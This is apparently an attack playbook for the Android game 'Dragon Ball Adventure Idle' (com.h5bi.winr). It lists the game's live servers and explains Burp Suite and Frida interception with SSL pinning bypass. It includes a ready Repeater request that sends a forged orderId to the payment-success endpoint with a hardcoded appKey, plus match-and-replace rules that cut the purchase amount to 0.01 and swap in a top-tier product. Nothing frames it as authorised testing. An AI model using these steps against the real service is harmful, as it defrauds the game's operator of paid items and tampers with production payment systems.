# Burp Suite — Dragon Ball Adventure Idle (com.h5bi.winr) Intercept Setup

## Target Scope

Add all of these to Burp Suite scope:

| Host                           | Protocol | Port  |
|--------------------------------|----------|-------|
| account.pockerday.net          | HTTP     | 80    |
| aiwzfu.topgame.tw              | HTTPS    | 443   |
| 103.14.33.146                  | HTTP     | 89    |
| 128.1.41.107                   | HTTP     | 80    |
| 47.244.142.228                 | HTTP     | 80    |
| dragonh5cdn.popoh5.com         | HTTPS    | 443   |
| sdkapi.happytomato.com.tw      | HTTP     | 80    |
| qsdk.t4game.com                | HTTP     | 80    |
| tkd-qsdk.gigagames.co.th       | HTTP     | 80    |
| cloud.xdrig.com                | HTTPS    | 443   |
| push.xdrig.com                 | HTTPS    | 443   |

## Android Proxy Configuration

```
Proxy IP:   <your Burp machine IP>
Port:       8080
```

For emulator (AVD):
```bash
# Set proxy via adb
adb shell settings put global http_proxy <burp-ip>:8080
```

For physical device:
- Settings → Wi-Fi → Long-press network → Modify → Advanced → Manual proxy

## Installing Burp CA Certificate

```bash
# Export Burp CA in DER format, convert to PEM
openssl x509 -inform DER -in cacert.der -out cacert.pem

# For Android 7+ (system trust store required):
# Method 1: Magisk (rooted) — copy to /system/etc/security/cacerts/
openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1
# Output e.g. "9a5ba575" → copy as 9a5ba575.0

# Method 2: ADB (Android < 7 or rooted)
adb push cacert.pem /sdcard/
# Then Settings → Security → Install certificate → CA Certificate

# Method 3: Frida (no root needed) — already covered by 01_ssl_pinning_bypass.js
```

## Frida + Burp Combined Setup

```bash
# Terminal 1: Start Frida server on device
adb push frida-server /data/local/tmp/
adb shell "chmod +x /data/local/tmp/frida-server && /data/local/tmp/frida-server &"

# Terminal 2: Launch app with SSL bypass + traffic hooks
frida -U -f com.h5bi.winr \
  -l frida_scripts/01_ssl_pinning_bypass.js \
  -l frida_scripts/02_hook_signing.js \
  -l frida_scripts/03_hook_webview_traffic.js \
  --no-pause

# Burp Suite: Proxy → Options → Bind to 0.0.0.0:8080
# Intercept ON — look for requests to account.pockerday.net
```

## Priority Requests to Capture

1. **Login request** — capture: uid, username, token, sign
   - Endpoint: POST /v1/user/login or /v1/user/autoLogin
   - Fill these into api_tests/sign_helper.py → CAPTURED_SESSION

2. **Payment flow** — trigger an in-app purchase (even $0.99):
   - Capture: /v1/auth/createOrder → orderId
   - Capture: /v1/payment/paySuccess → full payload
   - Note: purchaseToken from Google Play

3. **CDKey redemption** — enter any CDKey in the account center:
   - Capture: /v1/user/actCdKey → exact request format + params

## Key Burp Repeater Tests

After capturing a login token, try these in Burp Repeater:

```http
POST /v1/payment/paySuccess HTTP/1.1
Host: account.pockerday.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Dalvik/2.1.0

uid=CAPTURED_UID&username=CAPTURED_USER&token=CAPTURED_TOKEN&
os=android&usermode=0&sign=COMPUTED_SIGN&appKey=51489327123659886251412561106451&
orderId=FORGED_ORDER_ID&payType=google&productId=com.h5bi.winr.crystal_01&amount=0.99
```

## Match & Replace Rules (Burp)

Add these to Proxy → Options → Match and Replace:

| Type    | Match              | Replace                | Comment                    |
|---------|--------------------|------------------------|----------------------------|
| Request | `amount=0\.99`     | `amount=0.01`          | Reduce payment amount      |
| Request | `productId=.*?&`   | `productId=vip_max&`   | Upgrade product            |
| Request | `usermode=0`       | `usermode=1`           | Toggle user mode           |

## QuickGame SDK appKey (hardcoded)

```
appKey: 51489327123659886251412561106451
```

Use this in all manual API requests. The server should validate it but some
endpoints may only check its presence, not its exact value.
